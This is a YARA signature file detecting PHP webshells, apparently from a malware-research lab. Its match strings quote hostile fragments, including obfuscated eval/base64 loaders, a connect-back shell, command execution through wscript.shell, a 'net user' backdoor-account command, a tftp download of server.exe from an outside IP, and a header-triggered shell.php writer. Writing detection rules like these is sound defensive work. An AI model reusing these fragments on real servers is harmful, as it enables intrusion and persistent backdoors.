      $s20 = "if ($act == \"about\") {echo \"<center>Undetectable version by <br> Spyn3t <br> <img src=\\\"http://emp3ror.com/images/emplogo1." ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule sig_6454cc5ab73143d72cf0025a81bd1fe710351b44
{
   meta:
      description = "php17 - file 6454cc5ab73143d72cf0025a81bd1fe710351b44.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "236d757657925bf85cb39eb13606e3a36df8c49b26365639e4dad81752060ee0"
   strings:
      $s1 = "echo \"<br>Connect back Shell , bypass Firewalls<br>" fullword ascii
      $s2 = "echo \"<br><center><h3> CMD ExeCute </h3></center>\" ;" fullword ascii
      $s3 = "echo \"<br><center><h3> Fake Mail- DOS E-mail By Victim Server </h3></center>\" ;" fullword ascii
      $s4 = "//fake mail = Use victim server 4 DOS - fake mail " fullword ascii
      $s5 = "echo \"<a href='?id=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>download\";" fullword ascii
      $s6 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">" fullword ascii
      $s7 = "CMD</font></span></a><font face=\"Tahoma\" size=\"2\"> Shell</font></b></p>" fullword ascii
      $s8 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword ascii
      $s9 = "<title>SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend </title>" fullword ascii
      $s10 = "//Connect Back -Firewall Bypass" fullword ascii
      $s11 = "header(\"Content-Disposition: attachment; filename=$entrypath\");" fullword ascii
      $s12 = "<font color=\"#666666\">www.simorgh-ev.com</font></a></font></td>" fullword ascii
      $s13 = "echo \"<script language='javascript'> alert('Sending Mail - please waite ...')</script>\";" fullword ascii
      $s14 = "$result=shell_exec(\"$cmd\");" fullword ascii
      $s15 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {" fullword ascii
      $s16 = "//cmd-command line" fullword ascii
      $s17 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword ascii
      $s18 = "header(\"Content-Length: \" . filesize($name));" fullword ascii
      $s19 = "echo \"<script language='javascript'> alert('\\:D Successfully uploaded.!')</script>\";" fullword ascii
      $s20 = "<span style=\"text-decoration: none\"><font color=\"#000000\">File Manager</font></span></a></font></span></font></b></p>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule php17_4
{
   meta:
      description = "php17 - file 4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2d63e269ebe4d87819d9170b034610730e667230efd44f59657e8823c97de870"
   strings:
      $x1 = "eval(gzinflate(base64_decode('FJ3Hbutcskbn/SL9AxwwJ6BxG8wSc06TBnMmxRye/tIT4wAmjrj3rvpqLVui//t///nvr/7961/FkfT/VE8zln2yFf+kyVoQ2P" ascii
      $s2 = "dircvcFTEi5BAOV17u/Y0u8pF+aTGCGyJobsHFC4SWss71ItmPgx3UJCe6UiZT54Ep6C196jOEvCBmQKEOGGZmLqm4sVc7LLot16AjltAp3go8xfaebBCMFIn7fXPB1Q" ascii
      $s3 = "ZybFf1S3hKuTs4ybcrGmP0dbJtxHlZfFydj3kb9qiYRxCbCXOjSWAgZJ1gw2jo/m0Mg/TMpMMBt3VG1ZterMpyeNVQ7UkdAHSM+p0hJDLLjNMSEv1dzLOTCkVsLqR9Rr" ascii
      $s4 = "Nn0kK7U6GW16lcyNPeCbOPm37i3ASix0odiN8fvHLeRrXRWrz9XQV6xdGmW0wtExeEarY2uhdaKXzxMi3zrpVWMxFG615+XoJ8iNpipE9cEPOqnuAT8fq4b2gg+3cE7o" ascii
      $s5 = "$password = \"admin\";  //" fullword ascii
      $s6 = "AQlNp5d/SkMcjXmBaGSuNASkYmGXn/2t9q/lxBpf23nfL0SmuWfupTZmQq4QP3aFgwtQBlA6h4WOrMk1aiNot5UtJJGyVrjED7Qc0EhiBXlVMQAK6eYE44GAyLG0CrSs" ascii
      $s7 = "LUcjA8FY2s+4eWtWGIJIQ1UIhCuvFTyZaVbALTrd/FTptXZpyNigJqrjiit8bO8VbdOtJf5Qk7hDyKTyGWX3H6xqQM9oMzTzY480V6gBb0xgYXSc0XWFOTbv9wrOnse6" ascii
      $s8 = "+h4QELkGKYVfbFHaWC1jABJHf7ywudB1odCmmRbq8XEyeyMLlhWFk07T1ZivaXhuGpGv1rO7h7ouCcBA24josbHX72jUfntPgS9VKZFlJNGgG3wJEf4MvvJE8jR/5kJR" ascii
      $s9 = "mFSE4s5bN1nhBi6wcnLpc8lsyPgH3AAvaBa9aYX0XkcYmKus+yK6BB4uIFln44w6DqhUoT0HQac1RNgcjsmTljNkMxwkzjIvzaaJjgvjGC0M8EvDudIrCkadVWkRdSu0" ascii
      $s10 = "KdLX7A2Yipiz4IbTB6JuiXoCCMAvZWD9YM6uofg0BirclsvW2e8At1Le43LrtPkzDvu/QVswg5nIFkktgnreuTOgYrxF0rgWLPm6ErDduXyKXN+G7IaoWXzVcGMMn151" ascii
      $s11 = "dSY00+HbIHTsT2tpTQ/zw9WBAygZEuS2/h+9VpV/iUn/xq1a+nsnYMSkesZub7P0ciumJYNMtQNYBoawWiGr9NVNQKb5V7GCDOOgUOHknswmIXHbt1r/ykrVLH8SP6Gn" ascii
      $s12 = "otCLpuUq3slp0rqCZQWS1QEEFlLa4PM6iSk9lORlsWLRS8A4a+g74UIAS9Bm6dud1IA4fdIR6whybR5A6U+/UveNEYEwaLN57rrHZ30gABHInbNRiIw7DuXfmt0d8HVe" ascii
      $s13 = "lDQQ4P+SKmLeoDPV3GnZ+iwt+qTuPihN+5gEBM/qR5CmT3G6GwPV5V4iNkbDP/0rOmKHRW5LOgbb4v5KXwqplsgudCbe8KbURVioHrytoxgSTTKUqHkvskfUHSlo+Qjn" ascii
      $s14 = "E9X2GgYJTcn/gibslZswEfYdHmQPgEtB0YpMNPJGiGwI4+7XS4tBdYjbIp0Gq0oN4XvO7EalNOnyslNHhSt4BeGVkUIehA9C0v2dgv6+8XVvLYJ4NBkFDeS0zSzpCZNh" ascii
      $s15 = "ShHJvwl2dUDmO61cG/2qswFf98J64jXLLF0Ld8co3CPm78ZeAfrm4RSwj1Q/JpEAA/rqqqL4aY0hNxbPrWleRZuWXeYE0MAnyzdO/zDJL5k21prl+rXxhgoNfdVzJLI/" ascii
      $s16 = "tLcNqDtU1/nl3TkgIRC06DzYhQy23Du1LuL5safp/t5POvDOWdKhvN+MVZxNl/QFyHRVSrg9FUB3i3oCBZ5qZGNlS5gqA2Kz7lo1HULtdYLroKs0quL84RAeYf3ycF2S" ascii
      $s17 = "n4BKPnYeUe1hzc88el6a6Cq/snyMobyBlOAOFi/5yQONpUDLEkB9F3IN3o32fMzv2MLspYhCzadHLA4zBZmNkgqaH0Q2mdLMkn4D7sUsZvYgMI44RJGPb+LLYxDV+r6R" ascii
      $s18 = "iASveYEFgN9l+3MkhWkbhfqlyImtyaLYTMZYnqdbQpNdbG0LIEqAONG4TqLInItFG3YoIv4CWdAOxqlB649Z2n/CxwdVxE1PA5IkyE93DDaE0/pissHeWxm0p+MPlyM4" ascii
      $s19 = "wU4nOfOYM+Gm03gcMsSGl1ZDRLHJPxQ+gpg4N9Zizmp194z97XdPAvAtoP2ssmWMw7GX5Gdqpx6/OxNMC4DBJfSnjMs96nAWSAVhFlW2QwYB5cOckY4Zf4IYdsYYUwFF" ascii
      $s20 = "j7/Vgk0N5V/CWoHXNCWZwhFUt3COGP94M5PKIsBCUUUv3Vms72/SDqXzb64F1W0/TX5AyVuZo8YN5xrTu166SwOApLUg/smcQc5pCeVeJlVJegXUe/HehKyegcEyfH2u" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_0336dcbab05b9d5ad24f4333c7658a0e
{
   meta:
      description = "php17 - file 0336dcbab05b9d5ad24f4333c7658a0e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1a8ff79db30f498abb46f1e722a7307d208297cd43f8cc36a45e5a70928f9732"
   strings:
      $s1 = "if(isset($_GET['cmd']) || isset($_POST['passw'])) $html_onload = \"onload=\\\"document.getElementById('cmd').focus();\\\"\";" fullword ascii
      $s2 = "AAAAAAAAAAAAAAB" ascii
      $s3 = "target.style.background = '\".$shell_color.\"';" fullword ascii
      $s4 = "var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';" fullword ascii
      $s5 = "$shell_password = \"devilzc0der\";" fullword ascii
      $s6 = "<input style=\\\"width:300px;\\\" type=\\\"text\\\" name=\\\"childname\\\" value=\\\"\".$shell_name.\".php\\\"; />" fullword ascii
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFVQWDAAAAAA" fullword ascii
      $s8 = "<input style=\\\"width:100px;\\\" type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnNewUploadLocal\\\" value=\\\"Get\\\" />" fullword ascii
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii
      $s10 = "$shell_fake_name = \"Server Logging System\";" fullword ascii
      $s11 = "elseif((isset($_GET['view']) && ($_GET['view'] != \"\")) || ((isset($_GET['filename']) && ($_GET['filename'] != \"\")))){" fullword ascii
      $s12 = "header(\"Content-disposition: attachment; filename=\\\"\".basename($file).\"\\\";\");" fullword ascii
      $s13 = "AFZpcnR1YWxQcm90ZWN0AABWaXJ0dWFsQWxsb2MAAFZpcnR1YWxGcmVlAAAARXhpdFByb2Nlc3MA" fullword ascii
      $s14 = "AABPcGVuU2VydmljZUEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" fullword ascii
      $s15 = "TEwAQURWQVBJMzIuZGxsAFdTMl8zMi5kbGwAAExvYWRMaWJyYXJ5QQAAR2V0UHJvY0FkZHJlc3MA" fullword ascii
      $s16 = "$wBind=\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" fullword ascii
      $s17 = "var target = document.getElementById(address);" fullword ascii
      $s18 = "<tr><td style=\\\"width:120px;\\\">New Shellname</td><td style=\\\"width:304px;\\\">" fullword ascii
      $s19 = "<td style=\\\"width:10%;\\\"><input type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnCommand\\\" style=\\\"width:120px;\\\" val" ascii
      $s20 = "<td style=\\\"width:10%;\\\"><input type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnCommand\\\" style=\\\"width:120px;\\\" val" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule sig_1f080fa1122019389159fa4f63978222
{
   meta:
      description = "php17 - file 1f080fa1122019389159fa4f63978222.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "54b60f755fb2b480feb91ff7e3aea527c5a60c413356b39c86ee55f38b3ef166"
   strings:
      $x1 = "YU0xcDd1MVZiYmxjRmRIa3kxVDllS2NFWnpHQS8vc2I1WHJrNzBPK0hqZTlWL2NqNDlIWkVDbHFNc3hDdnM5RS9lLzZBcy8zNUo4VXhySG9HbFNyQ1JoUWFP" fullword ascii
      $x2 = "U2R6SEUrb29LOG9iMW41UklHemVzeHVQK1kraDlFOUJEajVmS1d3RnVGVjlJVzhTS2RoUUNRRnRGcUZ2MkpmTFZmMWtKb3F3b1JvQW8wdWR2WTk4VnY4OFhZ" fullword ascii
      $x3 = "ZWs5YXZRWmVPSTVlajJzVXhNbmdubUUvSWsxMFkrZDdWbkpuUytBQ2Znei9uQkllOGJEckoxVzNJTEZaUGpYUmNTRzZ5ZkJlTmxiZ0tlRWtTUVdDVldHQi9i" fullword ascii
      $x4 = "TytIamU5Vi9jajQ5SFpFQ2xxTXN4Q3ZzOUUvZS82QXMvMzVKOFV4ckhvR2xTckNSaFFhT0J4Q0ZhNW14QUczTnNJUzRmaHdLLzRzL05lK0gra2M5L2gvZmc5" fullword ascii
      $x5 = "Q1FGdEZxRnYySmZMVmYxa0pvcXdvUm9BbzB1ZHZZOThWdjg4WFlaTHpvaUl1R083eDliVWZyOHRUNkxFSGhxaHlPbEpPenNXWjBQRjhTOEV1VExQWHBDcFJp" fullword ascii
      $x6 = "QUFpZnBucHhleUZqTjRMK0pYM0R3L2h5YTRSVmhVN21BT0szOFYzdEh0MUQxUnZ0L1NWaUdremtia20wRmVRSXFuZklKVmtESTBMdFljVlRhMHhkbDRuNU94" fullword ascii
      $x7 = "NklIeHZqNVY3MDhnYnVtak4wY0JhY3dwTk9tRDZBK3JWVGFFN202alo1RTJzRFZubDE5ajdIdURWTnRVZnJ3WVRVRkpkekp1T0NMTlB0WjQzaFl5NkRWeUhP" fullword ascii
      $x8 = "KzdNMXZ0cWtKY3kvREVUMC9UZEJ5eHBRMHh2bS9MNE5ydXNaLyt6RXZNL2lNRnk3Z3J3Nk5sMjVuRkNlZmVORlZJM3prc2FGZlpJS0lvMUNVZ055K3NzNDZG" fullword ascii
      $x9 = "Tm5ZSlk4WlJrM21QWlBucEVmbndVQWs0RTBUSWo4dmNHVUZMdlRsOGRaaEhTdFZVeGpsbUwxT0NuR0dFVGtXRHNyUVd2ZnptTEdtWVZWcFlDR1NpQUlVbGFm" fullword ascii
      $x10 = "VGVZMlRwVHkrckNzNzRWUGhJQSsxelY0Y0ZDTThicjBXU2h5ZEJyRlFLU3FZNTNVTCtZK0xmOUd5aWE3SDR5eGJZQUpqY3YydjVaOWJuSkhWWG5rOTNLazhX" fullword ascii
      $x11 = "ZjlmZDkuPSJcMTQ0IjskZjZkNGVlMWMuPSJceDY1Ijskd2Y0NTBhNDIuPSJcMTU2Ijskd2Y0NTBhNDIuPSJcMTY0IjskdGRlZjlmZDkuPSJceDY1Ijskd2Y0" fullword ascii
      $x12 = "a0dqTklkVk53YVNZK25JTXpIT2VaTm1Qb0UzWGVubzlGaUEwWHovY24ydC9kV2J5dldnbFdaZlFpQVYxRGQxSDlHQUlrS2F1SkJvaTlIYk5oVm53dklrRS9T" fullword ascii
      $x13 = "NjUiOyRlOWRkYjg4MD0iXHg2NyI7JHU5M2RhOGVjPSJceDczIjskd2UxZWMzM2M9Ilx4NzMiOyR3ZjQ1MGE0Mj0iXDE0NiI7JGY2ZDRlZTFjPSJcMTYwIjsk" fullword ascii
      $x14 = "eDI4IixfX0ZJTEVfXyk7QGV2YWwoJHU5M2RhOGVjKCR3ZWY0N2MyNygkZjZkNGVlMWMoIlx4MmZceDVjXHgyOFx4NWNceDIyXDU2XDUyXDEzNFx4MjJceDVj" fullword ascii
      $x15 = "bXpOSml0dnBXeTFrTVphZXF2MnhCVHovNEhIYk43bHk2R2RmT1FlYmxEancxOUxDNjZBeHU2NlBNN0xzQjJWUkJaY01JYy9xbERQdUZ1U0dvWGNlbldlMU1L" fullword ascii
      $x16 = "MlhnTWxrTG5DU3lWMVVGNzA3bHpwdmVMd21NaFZDa3I4VmZOejArR1YyK0g0ZVJjZUNtck9oT3c0d1ZlUWJYNHEzalJNQWNZR0dZRjZlRGkwZ3E1MVFOcGNn" fullword ascii
      $x17 = "MTg5ODQ5Mi49IlwxNjMiOyRmNmQ0ZWUxYy49IlwxNDUiOyR0ZGVmOWZkOS49Ilx4NzMiOyR3ZWY0N2MyNy49IlwxNDEiOyR3ZjQ1MGE0Mi49Ilx4NmMiOyRx" fullword ascii
      $x18 = "dktjVGp0WkpuSkRHMFlmQWRXK2c3V3ZEcjlDdU84OGF4WEdFRUVhb2VVNjB2bVVPL1BveXFjeW5RYnhnd2s3bVd1WmlvWUVFMFJXeEhzdXYycVBVK3JUeCtH" fullword ascii
      $x19 = "ZjQ1MGE0Mi49Ilx4NjUiOyRlOWRkYjg4MC49IlwxNTYiOyRmNmQ0ZWUxYy49Ilx4NjciOyR3ZTFlYzMzYy49IlwxMzciOyRuMTg5ODQ5Mi49IlwxNDUiOyR3" fullword ascii
      $x20 = "LyszOE9pLytsdGx2bmM0ZkRxdmxuRi9BanFjRDFyWXBuZThIcC9wNVpKM0twVHM0OXZQTFpNai9IUVozQzVJVnRuWU41eFBWNC9Qd1ZQUURPSmhUVmpISTVD" fullword ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 30KB and
      1 of ($x*)
}

rule sig_2_2_2_pl
{
   meta:
      description = "php17 - file 2.2.2-pl.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ebe8c57c0855b8ec007a1767f71fda74587b12c901487088e13cd67753b000f9"
   strings:
      $s1 = "$this->processResults($class, $description, array($modx->manager, 'alterField'), array($class, 'id'));" fullword ascii
      $s2 = "/* [#7646] Increase size of session.id field to handle up to 255 chars */" fullword ascii
      $s3 = "$table = $modx->getTableName('modSession');" fullword ascii
      $s4 = "* Specific upgrades for Revolution 2.2.2-pl" fullword ascii
      $s5 = "* @var modX $modx" fullword ascii
      $s6 = "* @subpackage upgrades" fullword ascii
      $s7 = "* @package setup" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_8a86a21550fb7583887d8cecd484b497
{
   meta:
      description = "php17 - file 8a86a21550fb7583887d8cecd484b497.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d558018e7a2dc2c00278123c1be1ada633127f3e2348b9112bfa25002a3403b9"
   strings:
      $s1 = "4G;5@E0:?DG\";OT=\"\";for(j=0;j<MI.length;j++){OT+=ML.charAt(MI.charCodeAt(j)-48);}document.write(OT);</script>" fullword ascii
      $s2 = "background-image: url(http://zone-t.org/img/AlienWare_by_haltagetan.gif);" fullword ascii
      $s3 = "$header2 .= \"Content-Transfer-Encoding: 8bit\\r\\n\\r\\n\";" fullword ascii
      $s4 = "document.getElementById(\"enum\").innerHTML=myArray.length+\"<br />\";" fullword ascii
      $s5 = "$header2 = \"From: \".base64_decode('U29ycnkgPG5vJUB5YWhvby5jb20+').\"\\r\\n\";" fullword ascii
      $s6 = "document.getElementById(\"emails\").value += myArray[i]+\"\\n\";" fullword ascii
      $s7 = "About Test Mail(s)\\\\r\\\\Send $tms mail(s)\\\\r\\\\Error $tmns mail(s)\\\\r\\\\From $tmn mail(s)'); " fullword ascii
      $s8 = "<form name=\"form\" method=\"post\" enctype=\"multipart/form-data\" action=\"\">" fullword ascii
      $s9 = "sans-serif\"><textarea name=\"message\" rows=\"10\" style=\"width: 425px\"><?php echo($message); ?></textarea>&nbsp;<br />" fullword ascii
      $s10 = "$header2 .= \"Content-Type: text/html\\r\\n\";" fullword ascii
      $s11 = "$header .= \"Content-Type: text/html\\r\\n\";" fullword ascii
      $s12 = "<meta http-equiv=\"Content-Language\" content=\"en-us\" />" fullword ascii
      $s13 = "<!-- HTML And JavaScript -->" fullword ascii
      $s14 = "document.getElementById('preview').innerHTML = ms;" fullword ascii
      $s15 = "document.getElementById('preview').innerHTML=\"\";" fullword ascii
      $s16 = "document.getElementById('prvbtn').value = \"Hide\";" fullword ascii
      $s17 = "document.getElementById('prvbtn').value = \"Preview\";" fullword ascii
      $s18 = "document.getElementById(\"emails\").value=\"\";" fullword ascii
      $s19 = "sans-serif\"><input name=\"subject\" value=\"<?php echo($subject); ?>\" size=\"90\" type=\"text\" /> </font>" fullword ascii
      $s20 = "$header2 .= \"MIME-Version: 1.0\\r\\n\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule sig_34127df2be5061288e2863da49b977a4a025273f
{
   meta:
      description = "php17 - file 34127df2be5061288e2863da49b977a4a025273f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "43411e7e750ebfe589cc4004da7b67e907c6f2cfe868a00962ff6b08b515e4c2"
   strings:
      $x1 = "Str[17] = \"select shell('c:\\windows\\system32\\cmd.exe /c net user b4che10r abc123 /add');\";" fullword ascii
      $x2 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%ex" fullword ascii
      $x3 = "Str[23] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo '<?ph" fullword ascii
      $x4 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(r" ascii
      $x5 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; } function shellcode_decode($Url_String,$Oday_val" ascii
      $x6 = "Str[23] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo '<?php phpin" ascii
      $x7 = "t($_POST['cmdpath']) ? $_POST['cmdpath'] : 'c:\\\\windows\\\\system32\\\\cmd.exe'; print<<<END" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])) { $exe = @$shell->exec(\"$cmdpath /c \".$cmd); $out = $exe->StdOut(); $output = $out->ReadAll(); echo " ascii
      $x9 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x10 = "Str[15] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x11 = "';} } Root_Login($MSG_TOP); exit(); ob_end_flush(); } if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS()" ascii
      $x12 = "== 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code'],$Oday_value);} " fullword ascii
      $x13 = "if(!empty($_POST['run'])) echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '" fullword ascii
      $x14 = "','fso.createtextfile()'=>'fso.createtextfile(path,true)','<%execute(request())%>'=>'<%execute(request','<%eval request()%>'=>'<" ascii
      $x15 = "$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = isset($_POST['getfile']) ? $_POST['getfile'] : ''; " ascii
      $x16 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; } function shellcode_decode($Url_String,$Oday_va" fullword ascii
      $x17 = "$shell = new COM($com[$object]); if($object == 'wscript') { $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'dir'; $cmdpath = isse" ascii
      $x18 = "'; $cmd = 'dir'; if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];} print<<<END" fullword ascii
      $x19 = "'; $mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $sqlcmd = 'ver'; if(isset($_POST['mhos" ascii
      $x20 = "= VBScript.Encode %>'=>'<%@ LANGUAGE = VBScript.Encode %>','www.rootkit.net.cn'=>'www.rootkit.net.cn','Process.GetProcesses'=>'" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*)
}

rule activeLinkModel_class
{
   meta:
      description = "php17 - file activeLinkModel.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f83a779d8bda2fb2e07f795444da879d3e96e1a76f203053c1ef4bca7a1c2268"
   strings:
      $s1 = "* Date: 15/2/4" fullword ascii
      $s2 = "public function __construct($linkguidstr,$nextipstr,$ctimestr)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_9a9360f384cd4dec73a0e59595c42c21fe3f62bc
{
   meta:
      description = "php17 - file 9a9360f384cd4dec73a0e59595c42c21fe3f62bc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "47284da6148b045f8f19d0554c3cab15fbcecbb2bcb215412607a28d3287e4c7"
   strings:
      $s1 = "if(crypt($_SERVER['HTTP_H0ST'],51)=='514zR17F8j0q6'){@file_put_contents($_SERVER['HTTP_X'],$_SERVER['HTTP_Y']);" fullword ascii
      $s2 = "$out = \"GET /php_muma/client.php HTTP/1.1\\r\\n\";" fullword ascii
      $s3 = "$out .= \"User-Agent: MSIE\\r\\n\";" fullword ascii
      $s4 = "$out .= \"Host: 127.0.0.1\\r\\n\";" fullword ascii
      $s5 = "$fp = fsockopen(\"127.0.0.1\",80,$errno,$errstr,5);" fullword ascii
      $s6 = "$out .= \"Y: <?php eval(\\$_POST1);?>\\r\\n\";" fullword ascii
      $s7 = "header(\"Location: ./\".$_SERVER['HTTP_X']);};" fullword ascii
      $s8 = "$out .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";" fullword ascii
      $s9 = "$resp_str .= fgets($fp,512);//" fullword ascii
      $s10 = "$out .= \"Connection: close\\r\\n\\r\\n\";" fullword ascii
      $s11 = "$out .= \"X: ../shell.php \\r\\n\";" fullword ascii
      $s12 = "echo('fp fail');" fullword ascii
      $s13 = "$out .= \"H0ST: qiushui51a\\r\\n\";" fullword ascii
   condition:
      uint16(0) == 0x6c43 and filesize < 2KB and
      8 of them
}

rule sig_2e54212562c3f400c345f7159d1daa7e
{
   meta:
      description = "php17 - file 2e54212562c3f400c345f7159d1daa7e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "77ac246e124cdef3ac3d46f3dbbfb1b1468170742366730d9f030638f7a1a722"
   strings:
      $s1 = "$pw=\"b071e67503e9dcefecafd62e81704ef0\";$TXxQkK=\"7+8JvdssGfaXJcMn9IlwKEBJq469UKhSIVKNpOd8J52PpVgHGY8QjgJOPgE/LgNGjqAyGXLVSK2pj" ascii
      $s2 = "6J//+VP049FPOnBZfakeuEfQ3NQ6Rsw6Y+mmC4rNn1tqfzJD/e8Uz5bG0ex1wnQjWMqZnZzpniESvmfxW9uw2LvJzAtgx8yM9zl2FyYLnmm9RQAaGTmAMalTvwiL8c/a" ascii
      $s3 = "I4BpDn5mIthlAoMmJDChjZ3rn0rXtl3irc3+r+sei1gkEgWL2iV0+uxXMNYpHV8SYQfMxw9bf/3DDQgyZYnHmEqEqRMjVNXnVfA364KD2f4l8JDkREo1XzNTpWLTj8l1" ascii
      $s4 = "kSer6qb7lw7TvT9LxDGppVeNDgqNGlM5IapNnx0SPEzNAB00mbZD0kVLSpYT/H+/6+QivW+OFcy4v2R1nZJQ5UIw88RaRyArtHwpHsRgDAlUH6hkqwNcT4gbP91LtweH" ascii
      $s5 = "CGpyUOOFtf1AW1tFLYnDJN1Ioch/ws5H4OOkZkZWwHd3WLXMServglp/Uqyjd59DScVzklpvHcUyrdMS83JaxiJEGokZ+OzB4zbzx7vbLUHztZ7vq7UtvejlO0gT5fSR" ascii
      $s6 = "vfR84BLsInWTFfj/hFYC64fKNiwHkNoDk5QQq0eJZPRwaaXtglFWJBSA+27fp6MocF5K2C3KFL3akfba0hiWZh1yEkZGYsWs8/A9IWzwk0ixB7+Cjnyon3Nn77mS33Xc" ascii
      $s7 = "jovov7ssVAZjX+6eDiDF833azvTm1JsCxnl+XTdxnHN9IVZzXMyj6tck0LdweAiV9xqfikm+2DZ6WAtdMA01z/IgtXeWUCg+nm5DPJXt9A6wPv94aXqvSirungVeI7uW" ascii
      $s8 = "IaoVIS4K3SrwP1iNYU6pVgyW7nqutmpmEzJRJJFUyu53xd9yewMcWMH67c/RqBulOVKbWEHrqqGlgi0Py6T70mRiZsCmXqw8esrI55IGFwPmD5zpKJVK7qNRa+rKKoeQ" ascii
      $s9 = "SbCFBINnvjrGQ2BhE9UbarAyv95OyOS4gQFIKO+71Gp3BRRS8BHDW0S0hoKIx6JWhxzZC4a1g0e5199uZavNpjqPMdp0gKcOfkT6U7wnzNFWyzUglctxzFjx7R/BfZ+D" ascii
      $s10 = "BFJYdDud/L9ikkyMhpFDmBnJ//VWJPF3pLJuUKsqIYOxLqayt3Y4t5vpih8wQmObJt12M2BmnyXg6BH1rydQgJJp9KMfJDZxa98wzmbCu4LdEVq3HTH910CYFpCo5bI/" ascii
      $s11 = "rUp6kRIw50dW8OOWFVWdddZh8rnvielaGNQTw2BnUCnoCze+aZqTohaN27CNKqh5R3Da8KaX/fjZUYuJ7xKVNbwPH6V2Hw5WsOWSlP8kvUgzDMGYQe9KyJ46SE1M2E/8" ascii
      $s12 = "T4yzmTSEeAY1JEhVI8Kuigc8V4bCkD0A3GUen9omEJkb49y8oxtpFMCToDAO6z35tnjd8hIUvh+AyPoAIuu3/w/JaOtar5KkJEQ0gpx7vMFaMqRhjuQzHEPWU7I9ejKO" ascii
      $s13 = "Si9TgehzJgRgPEuzeCuNMrcPEr749CS3dgT1xSWQz2fR4UJQh3scRrlAo5QJjr6+LncoVkXq/fwr1unQ/Hs+Iwh8RE9U+//xG2p948N4zSgXRFgFJomAtDOm/p/6nRGF" ascii
      $s14 = "F/qv9x0N8IdR3AY+7dTdxExYn2cjxuRDgujErUEn+C1i96vd3dpa+biyg4x7jyqm14/4jjnMxsE3Hf0aFcxPf+O26pI4Pnwey9wxt0YYCZIfaBVFvjcL4+3klJpLentE" ascii
      $s15 = "z5zKdgprJ/Z/m2zUJF6l1JGxms0DMlBk7TXHcU5JH4m1JgjpuxOdnpOzXH6WWNyTtJ+Wz7yYZ2q1cEw4Bl5k57Qr1rGmfIJj8oZGR9hv/FuvBMgn11HSSkZ3jg2WCKCQ" ascii
      $s16 = "rMmIZlIji4q+2yqEK8u34FoXwWIiQjLw/SrVW4bBOk0ldwiw3m1thBRkFGbNtmyuQZj9GSb/Am1gOYeRV0fOJhhyydm5Gbqoak3IjzYrScWVAEIqyLqasefB7RSGfB/F" ascii
